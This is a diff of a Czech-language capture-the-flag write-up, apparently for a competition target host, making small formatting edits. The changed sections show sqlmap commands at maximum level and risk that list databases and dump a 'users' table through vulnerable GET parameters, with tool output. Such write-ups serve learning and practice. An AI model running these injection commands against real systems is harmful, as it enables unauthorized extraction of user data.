@@ -36,7 +36,7 @@ Jedná se tedy o SQL injection.
 #### Výpis databází 
 
 ```bash
-sqlmap --random-agent -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" --level 5 --risk 3 --dbs --threads 
+sqlmap --random-agent -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" --level 5 --risk 3 --dbs
 
 GET parameter 'type' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
 sqlmap identified the following injection point(s) with a total of 1892 HTTP(s) requests:
@@ -166,6 +166,7 @@ Výpis lze úspěšně provést i pomocí sqlmap - do parametru `type` dáme ně
 
 ```bash
 sqlmap --random-agent -u "http://navigation-plan.cns-jv.tcc/image.png?type=%22MTI0%22&t=targets&id=1" --level 5 --risk 3 -D navigation -T users --dump --threads 3 -p "t"
+
 GET parameter 't' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
 sqlmap identified the following injection point(s) with a total of 108 HTTP(s) requests:
 ---
